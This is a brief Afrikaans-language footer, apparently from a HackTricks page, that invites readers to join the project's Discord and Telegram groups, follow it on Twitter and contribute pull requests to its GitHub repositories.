* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
